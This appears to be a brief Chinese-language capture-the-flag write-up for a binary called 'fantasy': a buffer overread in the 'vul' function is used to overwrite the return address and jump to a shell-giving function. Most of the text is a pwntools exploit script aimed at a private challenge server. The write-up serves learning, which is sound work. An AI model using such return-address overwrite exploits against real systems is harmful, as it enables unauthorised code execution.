首先`checksec`

![fantasy](C:\Users\liu\Desktop\Notes\images\fantasy.png)

然后ida发现，在`vul`函数中读入超限，所以可以直接覆盖返回地址，执行`fantasy`函数获得shell。exp如下：

```python
from pwn import *

context(arch="amd64", os="linux", log_level="debug")

# io = process("./fantasy")
io = remote("172.21.4.12", 10101)

payload = "a" * 0x38 + p64(0x400735)

io.sendline(payload)
io.interactive()
```

